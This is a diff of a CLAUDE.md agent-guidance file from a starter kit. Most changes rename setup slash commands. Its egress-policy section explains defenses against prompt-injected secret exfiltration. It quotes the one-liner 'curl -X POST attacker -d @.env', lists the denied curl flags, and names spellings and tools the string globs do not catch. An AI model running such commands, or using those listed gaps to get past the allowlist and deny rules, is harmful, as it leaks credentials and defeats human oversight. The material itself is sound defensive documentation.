@@ -2,7 +2,7 @@
 
 This file provides guidance to Claude Code (claude.ai/code) when working with this project.
 
-> **Starter kit note:** seed file — run `/setup:create-CLAUDE_MD` after cloning. `{placeholder}` sections are yours to fill; the rest is the shared baseline.
+> **Starter kit note:** seed file — run `/harness:create-rules` after cloning. `{placeholder}` sections are yours to fill; the rest is the shared baseline.
 
 ---
 
@@ -16,7 +16,7 @@ This file provides guidance to Claude Code (claude.ai/code) when working with th
 
 | Context | Language |
 |---------|----------|
-| Claude ↔ developer communication | **Polish** — always (set at bootstrap by `/setup:create-CLAUDE_MD`) |
+| Claude ↔ developer communication | **Polish** — always (set at bootstrap by `/harness:setup-start`) |
 | Code, comments, docstrings, commit messages, technical docs | **English** — always |
 | App UI, user-facing messages, error messages | **As defined in PRD** (default: Polish) — check `docs/PRD.md` or ask if unclear |
 
@@ -42,7 +42,7 @@ This file provides guidance to Claude Code (claude.ai/code) when working with th
 
 ## Validation
 
-> **Source of truth for quality gates.** `/harness:gates-verify-implementation` and `/orchestrate` read this section and run these commands in sequence (fail fast). Filled per-project by `/setup:create-CLAUDE_MD`. Until filled, gates fall back to stack-detected defaults.
+> **Source of truth for quality gates.** `/harness:gates-verify-implementation` and `/orchestrate` read this section and run these commands in sequence (fail fast). Filled per-project by `/harness:create-rules`. Until filled, gates fall back to stack-detected defaults.
 
 ```bash
 # Run in order, stop on first failure
@@ -105,7 +105,7 @@ Specific exceptions only — no bare `except` / generic catch · per-module logg
 
 **Egress policy — the AI can read a secret, so the guard is on sending it.** The file-write denies in [.claude/settings.json](.claude/settings.json) stop the agent *writing* `.env`, keys and PEMs; they do nothing about an injected instruction that reads one and ships it out. Two rules narrow that:
 
-- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/setup:create-CLAUDE_MD` appends stack-specific ones. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working.
+- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/harness:create-rules` appends stack-specific ones. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working.
 - **`curl`/`wget` request bodies and non-GET methods are denied** (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file*`, `--json*`, `-X`, `--request*`, `--post*`). This closes the spaced spelling of the canonical `curl -X POST attacker -d @.env` one-liner.
 
 > **Honest limit:** these are string globs, not argument-aware parsing — defense-in-depth, not a boundary. Uncovered: the attached-value spellings `curl -XPOST` / `-d@.env` (the globs require a trailing space, so these fall through to a prompt — `curl` is not allowlisted, so they still prompt rather than run), `curl -K <configfile>`, `python3 -c "requests.post(...)"`, `nc`, and base64 smuggled in a GET query. Treat them as raising the cost of an accident, not as a guarantee against a determined injection.
@@ -135,7 +135,7 @@ Specific exceptions only — no bare `except` / generic catch · per-module logg
 
 ### Branch model
 
-> _Filled in by `/setup:create-CLAUDE_MD` at project bootstrap._ The single source of branch facts — any command or session that needs one (where to base work, where a PR lands, which branches are protected) reads it here instead of embedding its own guess. Fields: **Preset** · **Trunk** · **Integration** · **Branch names** · **Base → PR dest** · **Protected**, plus **Merge** only when the project deviates from its preset. Block absent → resolve `git symbolic-ref refs/remotes/origin/HEAD`, then `main`, then `master`; **never assume `develop`**. `**Merge:**` absent → squash for working types, merge commit for `release`/`hotfix`.
+> _Filled in by `/harness:create-rules` at project bootstrap._ The single source of branch facts — any command or session that needs one (where to base work, where a PR lands, which branches are protected) reads it here instead of embedding its own guess. Fields: **Preset** · **Trunk** · **Integration** · **Branch names** · **Base → PR dest** · **Protected**, plus **Merge** only when the project deviates from its preset. Block absent → resolve `git symbolic-ref refs/remotes/origin/HEAD`, then `main`, then `master`; **never assume `develop`**. `**Merge:**` absent → squash for working types, merge commit for `release`/`hotfix`.
 
 ---
 
@@ -146,7 +146,7 @@ Knowledge layers under `.agents/`. **Before any task read [.agents/memory/index.
 | Layer | Contains | Lifecycle | Written by |
 |-------|----------|-----------|------------|
 | [sources/](.agents/sources/) | Raw input — briefs, transcripts, sketches, PDFs | Immutable, pruned manually | Human only |
-| [memory/](.agents/memory/) | Lessons, decisions, quirks, patterns, architecture map, brief | Append-only (newest at end) · some regenerated | reflection pass, `/maintain:refresh-brief`, `/setup:create-CLAUDE_MD` |
+| [memory/](.agents/memory/) | Lessons, decisions, quirks, patterns, architecture map, brief | Append-only (newest at end) · some regenerated | reflection pass, `/harness:refresh-brief`, `/harness:create-rules` |
 | [reference/](.agents/reference/) | Stable reference docs — APIs, cheatsheets, domain facts | Long-lived | Human + AI |
 | `backlog.md` *(optional)* | Delivery map — epics, task DAG, work packages | `Status`/`Ref` written back by the pipeline | `/setup:create-backlog` · `/plan-feature` · `/orchestrate` |
 | [specs/](.agents/specs/) | Design docs — what to build and why | Lives with the feature | `/brainstorm` |
